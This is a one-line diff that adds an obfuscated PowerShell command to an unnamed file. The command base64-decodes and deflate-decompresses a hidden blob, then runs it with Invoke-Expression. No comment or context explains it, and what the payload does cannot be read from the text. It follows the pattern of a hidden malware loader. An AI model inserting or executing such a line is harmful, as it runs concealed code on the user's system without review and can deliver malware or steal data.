@@ -1,0 +1,1 @@
+iex ((New-Object IO.StreamReader((New-Object IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String('BcGxDsIgFAXQX2GjHXjEVUcdnOrQoTPVa30GgZQbi8aP95xpVcKdc6WxlWGBu2sK0R5MN2Bzl/mJK80AyoT5GBWJvZzylmIOt5GrpqWzD7LsvcdboyMqBS28SoS0z9cXKXVne/MzivYH'),[IO.Compression.CompressionMode]::Decompress)),[Text.Encoding]::ASCII)).ReadToEnd())
